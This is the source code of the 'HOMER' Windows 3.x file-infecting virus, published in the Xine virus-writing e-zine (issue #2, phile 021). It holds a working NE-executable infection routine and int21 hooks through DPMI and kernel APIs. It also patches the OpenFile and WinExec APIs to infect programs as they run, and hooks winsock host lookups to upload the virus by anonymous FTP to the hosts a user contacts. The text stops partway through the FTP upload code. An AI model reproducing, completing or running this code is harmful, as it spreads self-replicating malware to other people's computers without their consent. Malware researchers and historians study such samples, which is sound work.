   /*
                                           /-----------------------------\
                                           | Xine - issue #2 - Phile 021 |
                                           \-----------------------------/
   */

   /* HOMER virus by Kernel Panik, Italy, april 1997 */
   /* Compile with Borland C++ 4.0 in Large Model and with DS!=SS */
   /* please note some parts are very compiler dependent */
   /* if you want homer to work correctly it must be shorter than 64KB */
   /* so strip debugging information ! */

   /* Define if you want a info window */
   #define HASWINDOW 1

   /* Must be defined for many things to work ... it makes homer to
       register his window class */
   #define HASCLASS 1

   /* Define to hook int21 in pm via dpmi*/
   #define HOOKSDPMIPROTINT 1

   /* Define to hook int21 in rm via dpmi*/
   #define HOOKSDPMIREALINT 1

   /* Define to hook int21 in pm via api call SetKernelDosProc */
   #define HOOKSKDP 1

   /* Define to enable api hooking */
   #define HOOKSWIN16API 1

   /* Define to prevent homer to infect anything but path with TESTVIRZ inside*/
   #define TESTRUN 1

   /* Define to enable Internet Infection. */
   #define NETHOOK 1


   #define MAX_PATH 256

   #include <windows.h>
   #include <dos.h>
   #include <io.h>
   #include <fcntl.h>
   #include <stdio.h>
   #include <string.h>

   #ifdef NETHOOK
   #include <winsock.h>
   #endif

   #define LOWORD(l)  ((WORD)(l))

   #define MAKEWORD(a, b) \
        ((WORD)(((BYTE)(a)) | ((WORD)((BYTE)(b))) << 8))

   #pragma pack(1)

   typedef struct {
        WORD bp,di,si,ds,es,dx,cx,bx,ax;
        WORD ip,cs,flags;
        } REG_PARAMS;

   typedef struct {
       DWORD   EDI;
       DWORD   ESI;
       DWORD   EBP;
       DWORD   reserved;
       DWORD   EBX;
       DWORD   EDX;
       DWORD   ECX;
       DWORD   EAX;
       WORD    flags;
       WORD    ES;
       WORD    DS;
       WORD    FS;
       WORD    GS;
       WORD    IP;
       WORD    CS;
       WORD    SP;
       WORD    SS; } CB_STR;

   typedef void (_interrupt _far *INTRFUNC)();

   typedef struct {
       WORD  oldb;
       FARPROC wh; } WIN16HOOK;


   #ifdef HOOKSDPMIPROTINT
   /* old int21 vector in pm via dpmi */
   static INTRFUNC old = 0;
   #endif

   #ifdef HOOKSKDP
   /* old int21 vector in pm via windows api */
   static FARPROC old_dos = (FARPROC) 0;
   FARPROC (FAR PASCAL *GetSetKernelDosProc)(FARPROC DosProc) = 0;
   #endif

   #ifdef HOOKSDPMIREALINT
   /* old int21 vector in rm via dpmi */
   static FARPROC old_real = (FARPROC) 0;
   static CB_STR cb_storage;
   static int  rm_sel;
   static unsigned char old_stuff [10];
   #endif

   #ifdef HASWINDOW
   /* how many time int21 exec was triggered and last execed file */
   static int triggered=0;
   char lastrun[MAX_PATH]="\0";
   #endif

   /* Global Used Data. */

   /* sved ds for accessing global vars */
   static far save_ds;
   /* handle to memory block for homer code, name, ptr to code and size */
   HGLOBAL     hmem;
   char            myname[MAX_PATH];
   char *      mybuffer;
   long            mysize;
   /* int to hook */
   int         intno=0x21;
   UINT            th;
   /* selector for memory at 60:0 */
   WORD            mem_60_sel;
   /* residency check */
   WORD            rez_check;
   char far *  hptr;

   /* forward definition of procedure which does clean-up */
   void CleanUp(void);

   #ifdef HASCLASS
   LRESULT FAR PASCAL _export WndProc( HWND, UINT , WPARAM, LPARAM );
   #endif

   WORD FAR PASCAL _export TimerProc( HWND, WORD, int, DWORD);

   /* Infection Routine
       tnx to b0z0 for infomation and code examples
       this is a messy translation in C of an assembler routine, please refer
       to better sources if you want more detailed information about windows NE
       infection. I know this should be done in a better way
   */
   struct rblock
       {
           WORD    nrelitems;
           BYTE    prel;
           BYTE    trel;
           WORD    offwinip;
           WORD    oldcs;
           WORD    oldip;
       } infblock={1,3,4,0,0,0};

   struct segentry
       {
           WORD    off;
           WORD    len;
           WORD    attr;
           WORD    alloc;
        } newentry;

   unsigned char           readbuff[0x40];
   unsigned char           nebuff[512];
   int fhandle;
   unsigned readb,NEoff,SToff,nesize,align,recsize;
   long nelast;
   unsigned long segcount, filesize, origsegcount;

   extern far void RUNCODE_START();
   extern far unsigned RUNCODE_STUB_SIZE;
   extern far void RUNCODE_OLDIP();
   extern far unsigned RUNCODE_SIZE;

   #define READW(x) ( *( (unsigned *) (x) ) )


   void infect(char far * fname)
   {
       int i;

       _DS=save_ds;
   #ifdef TESTRUN
         if (strstr(fname,"TESTVIRZ"))
   #endif
         {
           if (!_dos_open(fname,O_RDWR,&fhandle))
               {
                   filesize=lseek(fhandle,0,SEEK_END);
                   lseek(fhandle,0,SEEK_SET);
                   _dos_read(fhandle,readbuff,sizeof(readbuff),&readb);
                   if (readbuff[0]=='M' && readbuff[1]=='Z' && readbuff[0x18]>40
                           && readbuff[0x12]!='K' && readbuff[0x13] != 'P')
                       {
                           NEoff= READW(readbuff+0x3c);
                           READW(readbuff+0x3c) -=8;
                           if (readbuff[0x3e]==0 && readbuff[0x3f]==0)
                               {
                                   readbuff[0x12]='K';
                                   readbuff[0x13]='P';
                                   lseek(fhandle,NEoff,SEEK_SET);
                                   _dos_read(fhandle,nebuff,sizeof(nebuff),&readb);
                                   if (nebuff[0]=='N' && nebuff[1]=='E' &&
                                       nebuff[0x36]==2 && nebuff[0x37]==8)
                                   {
                                       lseek(fhandle,0,SEEK_SET);
                                       _dos_write(fhandle,readbuff,sizeof(readbuff),&readb);
                                       SToff=READW(nebuff+0x22);
                                       if ( READW(nebuff+4) >= SToff )
                                           READW(nebuff+4) += 8;
                                       if ( READW(nebuff+0x24) >= SToff )
                                           READW(nebuff+0x24) += 8;
                                       if ( READW(nebuff+0x26) >= SToff )
                                           READW(nebuff+0x26) += 8;
                                       if ( READW(nebuff+0x28) >= SToff )
                                           READW(nebuff+0x28) += 8;
                                       if ( READW(nebuff+0x2a) >= SToff )
                                           READW(nebuff+0x2a) += 8;
                                       segcount=READW(nebuff+0x1c) ++;
                                       nebuff[0x37] = 0;           /* Kill gangload area */
                                       READW(nebuff+0x38) = 0;
                                       READW(nebuff+0x3a) = 0;
                                       origsegcount=segcount;
                                       segcount=segcount*8 + SToff;
                                       nesize=segcount/sizeof(nebuff);
                                       nelast=segcount%sizeof(nebuff);
                                       infblock.oldip=READW(nebuff+0x14);
                                       infblock.oldcs=READW(nebuff+0x16);
                                       align=READW(nebuff+0x32);
                                       recsize=1<<align;
                                       READW(nebuff+0x14)=0;
                                       READW(nebuff+0x16)=origsegcount+1;
                                       lseek(fhandle,NEoff,SEEK_SET);
                                       _dos_write(fhandle,nebuff,sizeof(nebuff),&readb);
                                       lseek(fhandle,NEoff,SEEK_SET);
                                       for (i=0;i<nesize;i++)
                                       {
                                           _dos_read(fhandle,nebuff,sizeof(nebuff),&readb);
                                           lseek(fhandle,-((long) sizeof(nebuff))-8,SEEK_CUR);
                                           _dos_write(fhandle,nebuff,sizeof(nebuff),&readb);
                                           lseek(fhandle,8,SEEK_CUR);
                                       }
                                       if (nelast>0)
                                       {
                                           _dos_read(fhandle,nebuff,nelast,&readb);
                                           lseek(fhandle,-nelast-8,SEEK_CUR);
                                           _dos_write(fhandle,nebuff,nelast,&readb);
                                       }
                                       else
                                           lseek(fhandle,-8,SEEK_CUR);
                                       newentry.off=((long) filesize )/ recsize;
                                       if ( (filesize%recsize) != 0) newentry.off++;
                                       newentry.len=mysize+RUNCODE_STUB_SIZE;
                                       newentry.attr=0x180;
                                       newentry.alloc=mysize+RUNCODE_STUB_SIZE;
                                       _dos_write(fhandle,&newentry,8,&readb);
                                       lseek(fhandle,((long)newentry.off)*recsize,SEEK_SET);
                                       RUNCODE_SIZE=mysize;
                                       _dos_write(fhandle,RUNCODE_START,RUNCODE_STUB_SIZE,
                                                       &readb);
                                       _dos_write(fhandle,mybuffer,mysize,&readb);
                                       infblock.offwinip=FP_OFF(RUNCODE_OLDIP);
                                       _dos_write(fhandle,&infblock,sizeof(infblock),
                                                       &readb);
                               }
                       }
               }
           _dos_close(fhandle);
         }

           return;
   }

   }

   /* Effective Interrupt Handler.
       pse note only ax,bx,cx,dx,si,di and ds,es are correct
        basic handlers must be corrected if you want to have other registers
       readly avaible.
   */

   void EffHandle(REG_PARAMS r)
   {
       _DS=save_ds;

       if (r.ax==0x4b00)       /* check for int21 exec*/
           {
   #ifdef HASWINDOW
               triggered ++;
               strncpy(lastrun,MK_FP(r.ds,r.dx),MAX_PATH);
   #endif
               infect(MK_FP(r.ds,r.dx));
           }
   }

   /*
       Now come DPMI interrupt handler and hookers. Please note these are
       pretty straigthforward if you know just a little bit about DMPI programming.
       A good source of information about is the Ralf Brown's Interrupts guide.
       Great code samples could be found (I'm using many of them here :-) in the
       book by Andrew Schulman Windows 95 Unleashed.
   */

   #ifdef HOOKSDPMIPROTINT
   void _interrupt _far IntHandler(REG_PARAMS r)
   {
        EffHandle(r);
        _chain_intr(old);
   }

   INTRFUNC _dpmi_get_pmode_vect(int intno)
   {
        INTRFUNC iv;
        _asm {
             mov ax, 0204h
             mov bl, byte ptr intno
             int 31h
             jc error
             mov word ptr iv+2, cx
             mov word ptr iv, dx
        }
        return iv;
   error:
        return (INTRFUNC) 0;
   }

   void _dpmi_set_pmode_vect(int intno, INTRFUNC iv)
   {   _asm {
             mov ax, 0205h
             mov bl, byte ptr intno
             mov cx, word ptr iv+2
             mov dx, word ptr iv
             int 31h
        }
   }

   #define get_vect(intno)     _dpmi_get_pmode_vect(intno)

   int set_vect(WORD intno, INTRFUNC handler)
   {
        _dpmi_set_pmode_vect(intno, handler);
        return (_dpmi_get_pmode_vect(intno) == handler);
   }
   #endif

   #ifdef HOOKSKDP
   void _interrupt _far IntHandler2(REG_PARAMS r)
   {
        EffHandle(r);
        _chain_intr( (INTRFUNC) old_dos);
   }
   #endif

   #ifdef HOOKSDPMIREALINT
   void _interrupt _far IntHandler3(void)
   {
       REG_PARAMS r;
       int     dummy;

       _DS=save_ds;

       r.ax= cb_storage.EAX & 0xffff;
       r.bx= cb_storage.EBX & 0xffff;
       r.cx= cb_storage.ECX & 0xffff;
       r.dx= cb_storage.EDX & 0xffff;
       r.si= cb_storage.ESI & 0xffff;
       r.di= cb_storage.EDI & 0xffff;

   /* selector madness .... change ds & es from segment addresses to selectors
       keep in mind we got an int21 in real mode, called back homer whcich runs
       in protected mode.
   */
       dummy=cb_storage.DS;
       _asm {
           mov    bx,dummy
           mov     ax,2
           int     31h
           jc          error
           mov     dummy,ax
       }
       r.ds=dummy;

       dummy=cb_storage.ES;
       _asm {
           mov    bx,dummy
           mov     ax,2
           int     31h
           jc          error
           mov     dummy,ax
       }
       r.es=dummy;

       EffHandle(r);

   error:

       cb_storage.CS=0x60;         /* return to the right place in rm*/
       cb_storage.IP=5;
   }

   INTRFUNC hook_real_vect(int intno, INTRFUNC handler)
   {
        INTRFUNC iv;
        int cb_sel, cb_seg;

        _asm {
             mov       ax, 200h                /* get old int */
             mov       bl, byte ptr intno
             int       31h
             jc        error
             mov   word ptr iv+2, cx
             mov   word ptr iv, dx
             mov       ax,2h                   /* allocate place for callback at 0:60 */
             mov       bx,60h
             int       31h
             jc        error
             mov       dx,ax
             mov       ax,bx
   /* ax=seg, dx=sel */
             mov       cb_seg,ax           /* save sel and seg pointer to place for cb */
             mov       cb_sel,dx
             mov       ax,0303h                /* allocate callback from rm to our routine in pm */
             push  es
             push  ds
             mov       si, offset IntHandler3
             mov       di, offset cb_storage
             push  ds
             pop       es
             push  cs
             pop       ds
             int       31h                 /* seg:off of cb in cx:dx */
             mov       ax,ss:cb_sel        /* ds->sel in lomem */
             mov       ds,ax

             push  cx                      /* save old stuff at that address */
             push  ss
             pop       es
             mov       cx,05h              /* 5 words to save */
             xor       si,si
             mov       di,offset old_stuff
             rep       movsw                   /* save old bytes at 60:0 */
             pop       cx

   /* this code builds on the fly the callback code at 60:0. It is the
       interrupt handler which get called from real-mode */

             mov       ah,0eah             /* jmp far */
             mov       byte ptr [0],ah
             mov       word ptr [1],dx /* place off cb */
             mov       word ptr [3],cx /* place seg cb */
             mov       byte ptr [5],ah /* jmp far */
             mov       ax,word ptr ss:iv
             mov       word ptr [6], ax    /* place off oldint */
             mov       ax,word ptr ss:(iv+2)
             mov       word ptr [8], ax    /* place seg oldint */
             pop       ds
             pop       es
             mov       ax,0201h                /* finally hook the handler via apropiate DMPI call */
             mov       cx,cb_seg
             mov       dx,0
             mov   bl,21h
             int       31h
        }
        rm_sel=cb_sel;                 /* save selector corresponding to 60:0 */
        return iv;
   error:
        return (INTRFUNC) 0;
   }

   void unhook_real_vect(int intno, INTRFUNC iv)
   {   _asm {
             mov ax, 0201h             /* restore old interrupt handler */
             mov bl, byte ptr intno
             mov cx, word ptr iv+2
             mov dx, word ptr iv
             int 31h


             mov       ax,2h                   /* get selector */
             mov       bx,60h
             int       31h

             push  ss
             pop       ds
             mov       es,ax
             mov       cx,05h              /* restore old content in memory */
             xor       di,di
             mov       si,offset old_stuff
             rep       movsw

        }
   }
   #endif

   #ifdef HOOKSWIN16API

   #ifdef HASWINDOW
   /* for statiscal use only */
   int nOpenFile=0, nWinExec=0;
   char sOpenFile[MAX_PATH]="\0";
   #endif
   char sWinExec[MAX_PATH]="\0";

   /* interrupt to use */

   BYTE i1,i2;

   /* 1 if that hooker is active, 0 otherwise */
   int activeOpenFile=1, activeWinExec=1;
   /* here are information needed to restore the code of the old API when
       the hooker ended his job */
   WIN16HOOK saveWinExec, saveOpenFile;

   void _interrupt _far IntWinExec(REG_PARAMS r)
   {
           WORD    save_sp;

           asm mov save_sp,sp;

           _DS=save_ds;
           activeWinExec=0;
           * ( (WORD *) saveWinExec.wh ) = saveWinExec.oldb; /* restore windows api bits */
   /*      Black magic to adjust the old CS:IP
           note that this only works cause we are serving int's
           inside 16 bit ring 3 segments of the same task (that
           mean we went only through 1 interrupt gate) !
           this is also VERY compiler dependent! */
           _asm {
               push    bp              /* here we adjust CS and IP saved on the stack, so*/
               mov bp,save_sp  /* after the interrupt handler routine terminates */
               sub bp,10-01eh  /* the opcode we just corrected in place of our int */
               mov ax,[bp]     /* gets control */
               sub ax,2
               mov [bp],ax
               mov save_sp,bp
               pop bp
           }
   #ifdef HASWINDOW
        nWinExec++;
   #endif
        _asm {                   /* now it gets the name in sWinExec*/
           push    bp
           mov bp,[save_sp]
           add bp,20h
           mov ax,[bp]
           mov word ptr hptr,ax
           inc bp
           inc bp
           mov ax,[bp]
           mov word ptr (hptr+2),ax
           pop bp
        }
   #ifdef HASWINDOW
        strncpy(sWinExec,hptr,MAX_PATH);
   #endif
        infect(sWinExec);
   }

   void _interrupt _far IntOpenFile(REG_PARAMS r)
   {
           WORD    save_sp;

   /*   see routine IntWinExec for explanation */

           asm mov save_sp,sp;

           _DS=save_ds;
           activeOpenFile=0;
           * ( (WORD *) saveOpenFile.wh ) = saveOpenFile.oldb;
           _asm {
               push    bp
               mov bp,save_sp
               sub bp,10-01eh
               mov ax,[bp]
               sub ax,2
               mov [bp],ax
               mov save_sp,bp
               pop bp
           }
   #ifdef HASWINDOW
       nOpenFile++;
        _asm {                   /* for now it just gets the name in sOpenFile */
           push    bp                /* plese feel free to add any useful payload, but */
           mov bp,[save_sp]  /* remember: doing harm to innocent people is just */
           add bp,24h        /* a sign of lamerness and stupidity */
           mov ax,[bp]
           mov word ptr hptr,ax
           inc bp
           inc bp
           mov ax,[bp]
           mov word ptr (hptr+2),ax
           pop bp
        }
        strncpy(sOpenFile,hptr,MAX_PATH);
   #endif
   }

   #endif


   int hookwin16api(FARPROC apif, WIN16HOOK * s)
       {
           WORD dummy;

   /* this function saves information about bits of code at the brginning
       of the api handler in the apropiate DLL into the structure s and
       makes an alias descriptor for the cs of that function
   */

           s->wh=MK_FP(0,0);
           s->oldb = * ( (WORD *) apif );
           _asm {
               mov ax,0ah           /* create alias descriptor */
               mov bx, word ptr apif+2
               int 31h
               jc      error
               mov dummy, ax
           }
           s->wh=MK_FP(dummy,FP_OFF(apif));
   error:
       }

   int activewin16api(WIN16HOOK * s, BYTE cbint)
       {
       /* place an int cbint in the flash of a windows api */
           * ( (WORD *) s->wh ) = 0x00cd + cbint*256;
       }

   int restorewin16api(WIN16HOOK * s)
       {
       /* restores the original bits of thw window api */
           * ( (WORD *) s->wh ) = s->oldb;
       }


   #ifdef NETHOOK

   BYTE i3,i4;

   /* statistics, activation marker and hook information for
       both blocking and non-blocking gethostbyname WINSOCK api call */

   int nGetHostByName=0, nWSAGetHostByName=0;

   int activeGetHostByName=1, activeWSAGetHostByName=1;
   WIN16HOOK saveGetHostByName, saveWSAGetHostByName;

   #define MAX_HOSTNAME 1024
   /* slot where to keep information about resolved names */
   int slotstatus=0;
   char hostname[MAX_HOSTNAME]="\0";

   int ftpstatus=0;
           /* status of ftp connection
               0           ready
               1           getting name
               2           name got, connecting
               3           connected, sending preamble
               4           sent information, waitinf for server callback
               5           server connected us, send homer
               999      all went bad :-(
                       */


   void _interrupt _far IntGetHostByName(REG_PARAMS r)
   {
           WORD    save_sp;

   /*   see routine IntWinExec for explanation */

           asm mov save_sp,sp;

           _DS=save_ds;
           activeGetHostByName=0;
           * ( (WORD *) saveGetHostByName.wh ) = saveGetHostByName.oldb;
           _asm {
               push    bp
               mov bp,save_sp
               sub bp,10-01eh
               mov ax,[bp]
               sub ax,2
               mov [bp],ax
               mov save_sp,bp
               pop bp
           }
   #ifdef HASWINDOW
        nGetHostByName++;
   #endif
        _asm {             /* get host-name the application tried to resolve */
           push    bp
           mov bp,[save_sp]
           add bp,1eh
           mov ax,[bp]
           mov word ptr hptr,ax
           inc bp
           inc bp
           mov ax,[bp]
           mov word ptr (hptr+2),ax
           pop bp
        }
        strncpy(hostname,hptr,MAX_PATH);   /* memorize hostname */
        if (!ftpstatus) slotstatus=1;      /* and singal it if not busy */
   }

   void _interrupt _far IntWSAGetHostByName(REG_PARAMS r)
   {
           WORD    save_sp;

   /*   see routine IntWinExec and INTGetHostByName for explanation */

           asm mov save_sp,sp;

           _DS=save_ds;
           activeWSAGetHostByName=0;
           * ( (WORD *) saveWSAGetHostByName.wh ) = saveWSAGetHostByName.oldb;
           _asm {
               push    bp
               mov bp,save_sp
               sub bp,10-01eh
               mov ax,[bp]
               sub ax,2
               mov [bp],ax
               mov save_sp,bp
               pop bp
           }
   #ifdef HASWINDOW
        nWSAGetHostByName++;
   #endif
        _asm {
           push    bp
           mov bp,[save_sp]
           add bp,24h
           mov ax,[bp]
           mov word ptr hptr,ax
           inc bp
           inc bp
           mov ax,[bp]
           mov word ptr (hptr+2),ax
           pop bp
        }
        strncpy(hostname,hptr,MAX_PATH);
        if (!ftpstatus) slotstatus=1;
   }

   #endif

   #ifdef NETHOOK

   #define WSA_SOCKET          WM_USER+1       /* message number for ftp control connection socket */
   #define WSA_DNS             WM_USER+2       /* message number for DNS resolution */
   #define WSA_SOCKET_SERVER  WM_USER+3        /* message number for ftp data connection */


       char                msg_buffer[1024];           /* receive buffer */
       char                server_name[128];
       char                service_name[]="ftp";   /* service to use */
       char                prologo[]="USER ftp\nPASS bill@microsoft.com\nCWD incoming\n"; /* ftp commands */
       char                msg_text[1024];


   /* socket and address information for both ftp connection to the host where we are
       uploading homer */
       SOCKET              client_socket, server_socket, new_socket;
       struct sockaddr_in  server_sck_addr, my_info,my_client_info,
                             client_sck_addr;
       struct sockaddr  other_side;
       int other_side_len,my_info_len,my_client_info_len;
       LPSERVENT           service_info;
       LPHOSTENT          host_info;
       long                    progress;       /* how many bytes we have send */


       struct linger mylinger={1,600};

       char far tmp_hostname[MAX_HOSTNAME];        /* buffers used during name resolution */
       char far resolver_buf[4*MAXGETHOSTSTRUCT];

       int conn_timeout;                       /* ftp connection timeout conunter */

       int ath;

   #ifdef HASWINDOW
       int resolved=0;
   #endif

   #endif

   HWND        hwnd ;
   HWND            global_hwnd;        /* our window handle */

   int PASCAL WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                LPSTR lpszCmd, int nCmdShow)
   {
   #ifdef HASCLASS
       static char szAppName[] = "Homer" ;
       WNDCLASS    wndclass ;
   #endif
       MSG         msg;
       HFILE           hfile;
       TIMERPROC   lpfnMyTimerProc;
   #ifdef NETHOOK
       FARPROC     tfun;
       HMODULE     tmod;
       int         err;
       WORD        wVersionRequired;
       WSADATA         WsaData;
   #endif

   /* This is the residency check */
   _asm{
           mov     ax,02h
           mov     bx,060h
           int     31h
           mov     mem_60_sel,ax
           push        ds
           mov     ds,ax
           cmp     word ptr ds:[10],'PK'       /* check for KP at 60:10 */
           pop     ds
           jne     not_resident
   }
           return 0;
   not_resident:

       save_ds=_DS;

       GetModuleFileName(hInstance, myname, MAX_PATH); /* name from which we have been booted */

       if (!hPrevInstance)
       {
   #ifdef HASCLASS
           wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
           wndclass.lpfnWndProc   = (WNDPROC)WndProc ;
           wndclass.cbClsExtra    = 0 ;
           wndclass.cbWndExtra    = 0 ;
           wndclass.hInstance     = hInstance ;
           wndclass.hIcon         = LoadIcon( NULL, IDI_APPLICATION );
           wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
           wndclass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
           wndclass.lpszMenuName  = 0;
           wndclass.lpszClassName = szAppName ;

           RegisterClass (&wndclass) ;
   #endif
     }
     else
     {
       return 2;
     }



   /* Here we assume we have to go resident .... residence check must be
    done before! */

   /* We copy ourself in memory */

       hfile= _lopen(myname, READ);
       mysize= _llseek(hfile,0,2);

       hmem=GlobalAlloc(GMEM_MOVEABLE, mysize);

       mybuffer=GlobalLock(hmem);
       _llseek(hfile,0,0);
       _lread(hfile,mybuffer,mysize);
       _lclose(hfile);


   /* Put our residency check in memory */
   _asm{
           push        ds
           mov     ax,mem_60_sel
           mov     ds,ax
           mov     ax,'PK'
           xchg        word ptr ds:[10],ax
           pop     ds
           mov     rez_check,ax
   }

   #ifdef HOOKSDPMIPROTINT
       old = get_vect(intno);
       if (! set_vect(intno, (INTRFUNC) IntHandler))
             return 1;
   #endif

   #ifdef HOOKSKDP
       if ((intno == 0x21) && (GetSetKernelDosProc = GetProcAddress(
               GetModuleHandle("KERNEL"), "GETSETKERNELDOSPROC")))
                 old_dos = GetSetKernelDosProc((FARPROC) IntHandler2);
   #endif

   #ifdef HOOKSDPMIREALINT
       old_real=hook_real_vect(0x21, (INTRFUNC) IntHandler3);
   #endif

   #ifdef HOOKSWIN16API
       i1=0xba; i2=0xbb;           /* CHANGE TO A FREE INT! */

       if (i1)
       {
           set_vect(i1, (INTRFUNC) IntOpenFile);
           hookwin16api( GetProcAddress( GetModuleHandle("KERNEL"), "OpenFile" ),
                         &saveOpenFile);
           activeOpenFile=0;
       }

       if (i2)
       {
           set_vect(i2, (INTRFUNC) IntWinExec);
           hookwin16api( GetProcAddress( GetModuleHandle("KERNEL"), "WinExec" ),
                         &saveWinExec);
           activeWinExec=0;
       }

   #endif

   #ifdef HASCLASS
     hwnd = CreateWindow (szAppName,
        "Homer",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        NULL,
        NULL,
        hInstance,
        NULL) ;

   /* a timer is needed for many tasks */
       lpfnMyTimerProc = (TIMERPROC) MakeProcInstance((FARPROC) TimerProc, hInstance);
       th=SetTimer(NULL, 1, 1000, lpfnMyTimerProc);

       global_hwnd=hwnd;

   #ifdef HASWINDOW
       ShowWindow (hwnd, nCmdShow) ;
       UpdateWindow (hwnd) ;
   #endif HASWINDOW

   #endif

   #ifdef NETHOOK
       i3=0xbc; i4=0xbd;

        wVersionRequired = MAKEWORD( 1, 1 );   /* activate WINSOCK */

           err = WSAStartup( wVersionRequired, &WsaData );
           if ( ( err == SOCKET_ERROR ) || (LOBYTE( wVersionRequired ) < 1) ||
               ( LOBYTE( wVersionRequired ) == 1 && (HIBYTE( wVersionRequired ) < 1) ) )

           {
                           WSACleanup();
                           ftpstatus=999;
           }
           else
           {
   /* hooks the resolver funciotns in winsock.dll */
               tmod=GetModuleHandle("WINSOCK");

               if ( (i3) && (tfun=GetProcAddress( tmod,
                                                    "gethostbyname" ) ) )
               {
                   set_vect(i3, (INTRFUNC) IntGetHostByName);
                   hookwin16api( tfun, &saveGetHostByName);
                   activeGetHostByName=0;
               }

               if ( (i4) && (tfun=GetProcAddress( tmod,
                                                            "WSAAsyncGetHostByName" ) ) )
               {
                   set_vect(i4, (INTRFUNC) IntWSAGetHostByName);
                   hookwin16api( tfun, &saveWSAGetHostByName);
                   activeWSAGetHostByName=0;
               }
           }

   #endif


       while (GetMessage (&msg, NULL, 0, 0))
       {
        TranslateMessage (&msg) ;
        DispatchMessage (&msg) ;
       }

       CleanUp();

       return msg.wParam ;
   }

   void CleanUp(void)
   {
   #ifdef HOOKSDPMIPROTINT
       if (old)
           {
               set_vect(intno, (INTRFUNC) old );
               old=MK_FP(0,0);
           }
   #endif

   #ifdef HOOKSKDP
       if ((intno == 0x21) && old_dos)
           {
             GetSetKernelDosProc(old_dos);
             old_dos=MK_FP(0,0);
           }
   #endif

   #ifdef HOOKSDPMIREALINT
       if (old_real)
           {
               unhook_real_vect(intno, (INTRFUNC) old_real);
               old_real=MK_FP(0,0);
           }
   #endif

   #ifdef HOOKSWIN16API
       if (saveOpenFile.wh)
           {
               restorewin16api(&saveOpenFile);
               saveOpenFile.wh=MK_FP(0,0);
           }

       if (saveWinExec.wh)
           {
               restorewin16api(&saveWinExec);
               saveWinExec.wh=MK_FP(0,0);
           }

   #endif

   #ifdef NETHOOK
       if (saveGetHostByName.wh)
           {
               restorewin16api(&saveGetHostByName);
               saveGetHostByName.wh=MK_FP(0,0);
           }

       if (saveWSAGetHostByName.wh)
           {
               restorewin16api(&saveWSAGetHostByName);
               saveWSAGetHostByName.wh=MK_FP(0,0);
           }

       WSACleanup();
   #endif

   /* remove our residency check and restore original value */
   _asm{
           push        ds
           mov     ax,mem_60_sel
           mov     ds,ax
           mov     ax,rez_check
           xchg        word ptr ds:[10],ax
           pop     ds
   }

       KillTimer(NULL,th);

   #ifdef NETHOOK
       WSACleanup();
   #endif

       GlobalUnlock(hmem);
       GlobalFree(hmem);
   }

   #ifdef HASCLASS
   LRESULT FAR PASCAL _export WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
   {
       char buf[100];
       int result,sent;
   #ifdef HASWINDOW
       static short XC,YC,CC;
       PAINTSTRUCT PtStr;
       TEXTMETRIC tm;
       HDC hDC;
   #endif
       switch (message)
           {
   #ifdef HASWINDOW
               case WM_CREATE:
                   hDC=GetDC(hwnd);
                   GetTextMetrics(hDC,&tm);
                   XC=tm.tmAveCharWidth;
                   YC=tm.tmHeight+tm.tmExternalLeading;
                   CC=(tm.tmPitchAndFamily & 1 ?3 : 2) * XC /2;
                   ReleaseDC(hwnd,hDC);
                   return 0;

               case WM_PAINT:
                   InvalidateRect(hwnd,NULL,TRUE);
                   hDC=BeginPaint(hwnd,&PtStr);
                   sprintf(buf,"Homer-%ld is here!, LeftClick To Refresh.",mysize);
                   TextOut(hDC,XC,YC,buf,lstrlen(buf));
                   sprintf(buf,"Exec triggered %d times.",triggered);
                   TextOut(hDC,XC,2*YC,buf,lstrlen(buf));
                   sprintf(buf,"Last run: %s",lastrun);
                   TextOut(hDC,XC,3*YC,buf,lstrlen(buf));
   #ifdef HOOKSWIN16API
                   sprintf(buf,"API16 grabber: OpenFile(%d), WinExec(%d).",
                               nOpenFile,nWinExec);
                   TextOut(hDC,XC,4*YC,buf,lstrlen(buf));
                   sprintf(buf,"Last OpenFile: %s", sOpenFile);
                   TextOut(hDC,XC,5*YC,buf,lstrlen(buf));
                   sprintf(buf,"Last WinExec: %s",sWinExec);
                   TextOut(hDC,XC,6*YC,buf,lstrlen(buf));
   #endif
   #ifdef NETHOOK
                   sprintf(buf,"gethostbyname: blocking(%d), WSA(%d).",
                                   nGetHostByName, nWSAGetHostByName);
                   TextOut(hDC,XC,7*YC,buf,lstrlen(buf));
                   sprintf(buf,"Last asked hostname: %s", hostname);
                   TextOut(hDC,XC,8*YC,buf,lstrlen(buf));
                   sprintf(buf,"ftpstatus: %d; resolved: %d",ftpstatus,resolved);
                   TextOut(hDC,XC,9*YC,buf,lstrlen(buf));
                   sprintf(buf,"timeout counter: %d.", conn_timeout);
                   TextOut(hDC,XC,10*YC,buf,lstrlen(buf));
   #endif NETHOOK
                   EndPaint(hwnd,&PtStr);
                   return 0;
               case WM_LBUTTONDOWN:
                   InvalidateRect(hwnd,NULL,TRUE);
                   return 0;
   #endif
   #ifdef NETHOOK
               case WSA_SOCKET:
                   switch (WSAGETSELECTEVENT(lParam))
                   {
                       case FD_CONNECT:                        /* connection to the ftp port */
                           if (WSAGETASYNCERROR(lParam))
                               {
                                   ftpstatus=0;
                                   closesocket(client_socket);
                               }
                           else
                               {
                                   ftpstatus=3;                /* send ftp commands */
                                   send(client_socket,prologo,sizeof(prologo),0);
                                   recv(client_socket,msg_text,1024,0);
                               }
                           break;
                       case FD_READ:
                               recv(client_socket,msg_text,1024,0);    /* just discard what other host says */
                           break;
                       case FD_WRITE:
                               if (ftpstatus==3) /* sent prolog, now open socket
                                                           send port, send put and go
                                                           in ftpstatus 4 */
                               {
                               /* creates the ftp data port connection */
                               server_socket=socket(PF_INET,SOCK_STREAM,0);
                               setsockopt(server_socket,SOL_SOCKET,SO_LINGER,&mylinger,sizeof(mylinger));

                               if (server_socket==INVALID_SOCKET)
                               {
                                   ftpstatus=0;
                                   closesocket(client_socket);
                               }


                               server_sck_addr.sin_family=AF_INET;
                               server_sck_addr.sin_addr.s_addr=INADDR_ANY;
                               server_sck_addr.sin_port=0;

                               if (bind(server_socket,(LPSOCKADDR)&server_sck_addr,sizeof(server_sck_addr))==SOCKET_ERROR)
                               {
                                   ftpstatus=0;
                                   closesocket(server_socket);
                                   closesocket(client_socket);
                               }


